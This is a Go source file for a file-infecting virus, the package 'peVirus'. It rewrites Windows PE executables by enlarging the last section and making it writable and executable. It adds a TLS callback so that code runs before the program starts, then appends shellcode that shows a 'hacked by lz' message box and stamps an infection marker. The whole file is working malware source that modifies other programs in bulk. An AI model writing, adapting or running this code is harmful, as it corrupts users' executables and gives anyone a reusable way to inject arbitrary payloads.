package peVirus

import (
	"bytes"
	"encoding/binary"
	"os"
)

type peFileStruct struct {
	nt_offset                       uint32
	section_header_offset           uint32
	number_of_section               uint32
	size_of_section                 uint32
	offset_of_last_section_header   uint32
	optional_size                   uint32
	optional_offset                 uint32
	data_array_offset               uint32
	tls_data_array_offset           uint32
	last_section_VA                 uint32
	last_section_pointer_to_rawdata uint32
	tls_VA                          uint32
}

func BytesToUint64(b []byte) uint64 {
	_ = b[3]
	return uint64(b[0]) | uint64(b[1])<<8 | uint64(b[2])<<16 | uint64(b[3])<<24 | uint64(b[4])<<32 | uint64(b[5])<<40 | uint64(b[6])<<48 | uint64(b[7])<<56
}

func BytesToUint32(b []byte) uint32 {
	_ = b[3]
	return uint32(b[0]) | uint32(b[1])<<8 | uint32(b[2])<<16 | uint32(b[3])<<24
}

func BytesToUint16(b []byte) uint16 {
	_ = b[1]
	return uint16(b[0]) | uint16(b[1])<<8
}

func Uint32ToBytes(n uint32) []byte {
	x := uint32(n)

	bytesBuffer := bytes.NewBuffer([]byte{})
	binary.Write(bytesBuffer, binary.LittleEndian, x)
	return bytesBuffer.Bytes()
}

func Uint64ToBytes(n uint64) []byte {
	x := uint64(n)

	bytesBuffer := bytes.NewBuffer([]byte{})
	binary.Write(bytesBuffer, binary.LittleEndian, x)
	return bytesBuffer.Bytes()
}

var lzMark = "lzyyds"

func hasbeen_infected(fd *os.File, peHeader peFileStruct) bool {
	mark := make([]byte, 6)
	var mark_offset = peHeader.nt_offset + 8
	fd.Seek(int64(mark_offset), 0)
	fd.Read(mark)
	newMark := string(mark)
	return newMark == lzMark
}

func get_ntHeader(fd *os.File) (ne_offset uint32) {
	var data = make([]byte, 4)
	fd.Seek(0x3c, 0)
	fd.Read(data)
	ne_offset = BytesToUint32(data)
	return ne_offset
}

func get_optional_size(fd *os.File, peHeader peFileStruct) (optional_size uint32) {
	data := make([]byte, 2)
	fd.Seek(int64(peHeader.nt_offset+20), 0)
	fd.Read(data)
	optional_size = uint32(BytesToUint16(data))
	return optional_size
}

func get_secHeader(fd *os.File, peHeader peFileStruct) (section_offset uint32) {
	var nt_size uint32 = 0
	nt_size = uint32(24 + peHeader.optional_size)
	section_offset = nt_size + peHeader.nt_offset
	return section_offset
}

func get_numberofsection(fd *os.File, peHeader peFileStruct) (number_of_section uint16) {
	data := make([]byte, 2)
	fd.Seek(int64(peHeader.nt_offset+6), 0)
	fd.Read(data)
	number_of_section = BytesToUint16(data)
	return number_of_section
}

func get_size_of_section(fd *os.File, peHeader peFileStruct) (size_of_section uint32) {
	data := make([]byte, 4)
	fd.Seek(int64(peHeader.offset_of_last_section_header+16), 0)
	fd.Read(data)
	size_of_section = BytesToUint32(data)
	return size_of_section
}

func get_last_sectionVA(fd *os.File, peHeader peFileStruct) (last_section_VA uint32) {
	data := make([]byte, 4)
	fd.Seek(int64(peHeader.offset_of_last_section_header+12), 0)
	fd.Read(data)
	last_section_VA = BytesToUint32(data)
	return last_section_VA
}

func get_last_section_pointer_to_rawdata(fd *os.File, peHeader peFileStruct) (last_section_pointer_to_rawdata uint32) {
	data := make([]byte, 4)
	fd.Seek(int64(peHeader.offset_of_last_section_header+20), 0)
	fd.Read(data)
	last_section_pointer_to_rawdata = BytesToUint32(data)
	return last_section_pointer_to_rawdata
}

func set_mark(fd *os.File, peHeader peFileStruct) {
	mark := []byte("lzyyds")
	fd.Seek(int64(peHeader.nt_offset+8), 0)
	fd.Write(mark)
}

func write_tlsData32(fd *os.File, peHeader peFileStruct, size uint32) {
	imagebase_offset := peHeader.optional_offset + 28
	var imagebase uint32
	var data uint32
	temp := make([]byte, 4)
	fd.Seek(int64(imagebase_offset), 0)
	fd.Read(temp)
	imagebase = BytesToUint32(temp)
	data = imagebase + size + peHeader.tls_VA
	fd.Seek(int64(peHeader.last_section_pointer_to_rawdata+peHeader.size_of_section), 0)
	databytes := (Uint32ToBytes(data))
	fd.Write(databytes)
	for i := 0; i < 3; i++ {
		data += 4
		databytes = (Uint32ToBytes(data))
		fd.Write(databytes)
	}
	data = 0
	databytes = (Uint32ToBytes(data))
	for i := 0; i < 5; i++ {
		fd.Write(databytes)
	}
	data = imagebase + peHeader.tls_VA + size + 6*4 + 0x40
	fd.Write(Uint32ToBytes(data))
	data = 0
	for i := 0; i < 2; i++ {
		fd.Write(Uint32ToBytes(data))
	}
}

func write_tlsData64(fd *os.File, peHeader peFileStruct, size uint64) {
	imagebase_offset := peHeader.optional_offset + 28
	var imagebase uint64
	var data uint64
	temp := make([]byte, 8)
	fd.Seek(int64(imagebase_offset), 0)
	fd.Read(temp)
	imagebase = BytesToUint64(temp)
	data = imagebase + size + uint64(peHeader.tls_VA)
	fd.Seek(int64(peHeader.last_section_pointer_to_rawdata+peHeader.size_of_section), 0)
	databytes := (Uint64ToBytes(data))
	fd.Write(databytes)
	for i := 0; i < 3; i++ {
		data += 4
		databytes = (Uint64ToBytes(data))
		fd.Write(databytes)
	}
	data = 0
	databytes = (Uint64ToBytes(data))
	for i := 0; i < 5; i++ {
		fd.Write(databytes)
	}
	data = imagebase + uint64(peHeader.tls_VA) + size + 6*8 + 0x40
	fd.Write(Uint64ToBytes(data))
	data = 0
	for i := 0; i < 2; i++ {
		fd.Write(Uint64ToBytes(data))
	}
}

func infectCode32(fd *os.File, peHeader peFileStruct) {
	a := []byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C}
	b := []byte{0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41}
	c := []byte{0x6C, 0x7A, 0x79, 0x79, 0x64, 0x73}
	d := []byte{0x68, 0x61, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x6C, 0x7A}
	code := []byte{232, 0, 0, 0, 0, 91, 100, 139, 21, 48, 0, 0, 0, 139, 82, 12, 139, 82, 28, 139, 18, 139, 82, 80, 82, 83, 131, 235, 69, 83, 139, 194, 5, 208, 11, 2, 0, 255, 208, 91, 90, 129, 194, 80, 245, 1, 0, 83, 131, 235, 53, 83, 80, 139, 194, 255, 208, 91, 106, 0, 131, 235, 37, 83, 131, 195, 16, 83, 106, 0, 255, 208, 194, 0}
	count := (0x10 - len(a))
	for i := 0; i < count; i++ {
		a = append(a, 0)
	}
	count = (0x10 - len(b))
	for i := 0; i < count; i++ {
		b = append(b, 0)
	}
	count = (0x10 - len(c))
	for i := 0; i < count; i++ {
		c = append(c, 0)
	}
	count = (0x10 - len(d))
	for i := 0; i < count; i++ {
		d = append(d, 0)
	}
	count = (0x1a0 - len(code))
	for i := 0; i < count; i++ {
		code = append(code, 0)
	}
	fd.Seek(int64(peHeader.last_section_pointer_to_rawdata+peHeader.size_of_section+0x30), 0)
	fd.Write(a)
	fd.Write(b)
	fd.Write(c)
	fd.Write(d)
	fd.Write(code)
}

func infectCode64(fd *os.File, peHeader peFileStruct) {
	a := []byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C}
	b := []byte{0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41}
	c := []byte{0x6C, 0x7A, 0x79, 0x79, 0x64, 0x73}
	d := []byte{0x68, 0x61, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x6C, 0x7A}
	code := []byte{232, 0, 0, 0, 0, 91, 100, 139, 21, 48, 0, 0, 0, 139, 82, 12, 139, 82, 28, 139, 18, 139, 82, 80, 82, 83, 131, 235, 69, 83, 139, 194, 5, 208, 11, 2, 0, 255, 208, 91, 90, 129, 194, 80, 245, 1, 0, 83, 131, 235, 53, 83, 80, 139, 194, 255, 208, 91, 106, 0, 131, 235, 37, 83, 131, 195, 16, 83, 106, 0, 255, 208, 194, 0}
	count := (0x10 - len(a))
	for i := 0; i < count; i++ {
		a = append(a, 0)
	}
	count = (0x10 - len(b))
	for i := 0; i < count; i++ {
		b = append(b, 0)
	}
	count = (0x10 - len(c))
	for i := 0; i < count; i++ {
		c = append(c, 0)
	}
	count = (0x10 - len(d))
	for i := 0; i < count; i++ {
		d = append(d, 0)
	}
	count = (0x1a0 - len(code))
	for i := 0; i < count; i++ {
		code = append(code, 0)
	}
	fd.Seek(int64(peHeader.last_section_pointer_to_rawdata+peHeader.size_of_section+0x60), 0)
	fd.Write(a)
	fd.Write(b)
	fd.Write(c)
	fd.Write(d)
	fd.Write(code)
}

func infectFile(filename string) bool {
	fd, _ := os.OpenFile(filename, os.O_RDWR, 0644)
	defer fd.Close()
	var peHeaders peFileStruct
	if hasbeen_infected(fd, peHeaders) {
		return true
	}
	peHeaders.nt_offset = get_ntHeader(fd)
	peHeaders.optional_size = get_optional_size(fd, peHeaders)

	if peHeaders.optional_size == 240 {
		return false
	}

	peHeaders.section_header_offset = get_secHeader(fd, peHeaders)
	peHeaders.number_of_section = uint32(get_numberofsection(fd, peHeaders))
	peHeaders.offset_of_last_section_header = (peHeaders.section_header_offset + (peHeaders.number_of_section-1)*0x28)
	peHeaders.size_of_section = get_size_of_section(fd, peHeaders)
	peHeaders.optional_offset = peHeaders.nt_offset + 24

	peHeaders.size_of_section += 0x200
	fd.Seek(int64(peHeaders.offset_of_last_section_header+16), 0)
	fd.Write(Uint32ToBytes(peHeaders.size_of_section))
	var chracteristic uint32 = 0xE0000060
	fd.Seek(int64(peHeaders.offset_of_last_section_header+36), 0)
	fd.Write(Uint32ToBytes(chracteristic))
	peHeaders.size_of_section -= 0x200
	peHeaders.data_array_offset = peHeaders.optional_offset + (peHeaders.optional_size - 0x80)
	peHeaders.tls_data_array_offset = peHeaders.data_array_offset + 72
	peHeaders.last_section_VA = get_last_sectionVA(fd, peHeaders)
	peHeaders.tls_VA = peHeaders.size_of_section + peHeaders.last_section_VA
	peHeaders.last_section_pointer_to_rawdata = get_last_section_pointer_to_rawdata(fd, peHeaders)
	fd.Seek(int64(peHeaders.tls_data_array_offset), 0)
	fd.Write(Uint32ToBytes(peHeaders.tls_VA))

	if peHeaders.optional_size == 224 {
		var size uint32 = 0x18
		fd.Seek(int64(peHeaders.tls_data_array_offset+4), 0)
		fd.Write(Uint32ToBytes(size))
		write_tlsData32(fd, peHeaders, size)
		infectCode32(fd, peHeaders)
	} else {
		var size uint32 = 0x30
		fd.Seek(int64(peHeaders.tls_data_array_offset+4), 0)
		fd.Write(Uint32ToBytes(size))
		write_tlsData64(fd, peHeaders, uint64(size))
		infectCode64(fd, peHeaders)
	}
	set_mark(fd, peHeaders)
	return true
}

func Infect(peFile []string) (x64file []string) {
	for _, _file := range peFile {
		if !infectFile(_file) {
			x64file = append(x64file, _file)
		}
	}
	return x64file
}
